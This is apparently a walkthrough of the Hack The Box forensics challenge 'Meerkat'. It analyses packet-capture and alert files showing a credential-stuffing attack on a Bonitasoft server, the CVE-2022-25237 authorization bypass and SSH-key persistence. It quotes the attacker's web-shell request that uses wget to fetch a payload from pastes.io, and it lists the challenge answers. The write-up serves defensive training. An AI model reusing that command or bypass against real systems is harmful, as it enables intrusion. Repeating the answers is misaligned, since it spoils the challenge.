


# Steps to solve:-
---

1) **Download the file :** wget "https://challenges-cdn.hackthebox.com/sherlocks/easy/meerkat.zip/...."

2) **Unzip the file:** sudo 7z x Meerkat.zip
	
	 There are two files namely,
	 - meerkat-alerts.json
	 - meerkat.pcap
	


### 1) We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?

- First i analyze the `meerkat.pcap`, there i find that there is an application called bonita through which communication is happening.
- Then do the analysis  in the `meerkat-alerts.json`  i found the application name.

#### Answer :- Bonitasoft


### 2) We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?

- Just search on net. - https://owasp.org/www-community/attacks/Credential_stuffing

#### Answer :- Credential Stuffing


### 3) Does the vulnerability exploited have a CVE assigned - and if so, which one?

- By analyzing the Bonita block you will find the CVE.

#### Answer :- CVE-2022-25237


### 4) Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?

- By reading the CVE-2022-25237 you will find the the string which was appended to the API URL path to bypass the authorization filter by the attacker's exploit.
- Or, you can also filter with `http.request.method == "POST"` and by analyzing you will get the string  which was appended to the API URL path to bypass the authorization filter by the attacker's exploit.

#### Answer :- i18ntranslation


### 5) How many combinations of usernames and passwords were used in the credential stuffing attack?

#### Answer :- 56


### 6) Which username and password combination was successful?

- By executing `http.request.uri contains "login" || http.request.uri contains "signin"` you will get all the credentials which was successful (there is 204 status code - "No content" which means the server successfully processed the client's request but does not need to return any content. )

#### Answer :- seb.broom@forela.co.uk:g0vernm3nt


### 7) If any, which text sharing site did the attacker utilise?

- Filter with `http.request.method == "GET"` and analyzing the `GET /bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8 HTTP/1.1\r\n`  line, you will find the site.

#### Answer :- pastes.io


### 8) Please provide the filename of the public key used by the attacker to gain persistence on our host.

- From the question above we know that the attacker downloaded the next stage of the payload from pastes.io. By browsing to this page we can see the contents of the file.

#### Answer :- hffgra4unv


### 9) Can you confirm the file modified by the attacker to gain persistence?

- The file path where we saved the key.

#### Answer :- /home/ubuntu/.ssh/authorized_keys


### 10) Can you confirm the MITRE technique ID of this type of persistence mechanism?

#### Answer :- T1098.004





